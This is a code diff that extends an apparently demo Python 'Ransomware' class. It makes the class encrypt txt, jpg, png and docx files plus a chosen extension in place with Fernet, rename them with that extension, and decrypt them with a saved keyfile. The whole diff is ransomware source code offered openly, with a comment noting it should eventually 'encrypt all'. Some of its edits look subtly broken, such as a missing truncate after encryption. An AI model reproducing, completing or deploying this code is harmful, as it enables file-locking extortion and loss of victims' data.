@@ -5,7 +5,7 @@ import base64
 
 class Ransomware:
 
-    def __init__(self, key=None):
+    def __init__(self, extension, key=None):
         """
         Initializes an instance of the Ransomware class.
         
@@ -16,10 +16,11 @@ class Ransomware:
             cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
             file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
         """
-
+        self.extension = extension
         self.key = key
         self.cryptor = None
-        self.file_ext_targets = ['txt']
+        self.file_ext_targets = ['txt',self.extension,'jpg','png','docx'] #need to encrypt all this is just demo 
+        
 
 
     def generate_key(self):
@@ -81,21 +82,28 @@ class Ransomware:
             file_path:str: Absolute path to a file 
         """
 
-        with open(file_path, 'rb+') as f:
-            _data = f.read()
-
-            if not encrypted:
+        if not encrypted:
+            with open(file_path,'rb+') as f:
+                _data = f.read()
                 print(f'File contents pre encryption: {_data}')
                 data = self.cryptor.encrypt(_data)
                 print(f'File contents post encryption: {data}')
-            else:
+                f.seek(0)
+                f.write(data)
+            if self.extension!=None:
+                os.rename(file_path,file_path + self.extension)
+            else: pass
+        else: 
+            with open(file_path, 'rb+') as f:
+                _data = f.read()
                 data = self.cryptor.decrypt(_data)
                 print(f'File content post decryption: {data}')
-
-            f.seek(0)
-            f.write(data)
-            f.truncate()
-
+                f.seek(0)
+                f.write(data)
+                f.truncate()
+            if self.extension!=None:
+                os.rename(file_path,file_path[:-(len(self.extension))])
+            else: pass
 
 if __name__ == '__main__':
     # sys_root = expanduser('~')
@@ -107,13 +115,15 @@ if __name__ == '__main__':
     import argparse
     parser = argparse.ArgumentParser()
     parser.add_argument('--action', required=True)
+    parser.add_argument('--extension')
     parser.add_argument('--keyfile')
 
     args = parser.parse_args()
     action = args.action.lower()
     keyfile = args.keyfile
+    extension = args.extension
 
-    rware = Ransomware()
+    rware = Ransomware(extension)
 
     if action == 'decrypt':
         if keyfile is None:
@@ -122,6 +132,9 @@ if __name__ == '__main__':
             rware.read_key(keyfile)
             rware.crypt_root(local_root, encrypted=True)
     elif action == 'encrypt':
+        if extension is None:
+            
+            print('file extension missing please specify')
         rware.generate_key()
         rware.write_key('keyfile')
         rware.crypt_root(local_root)
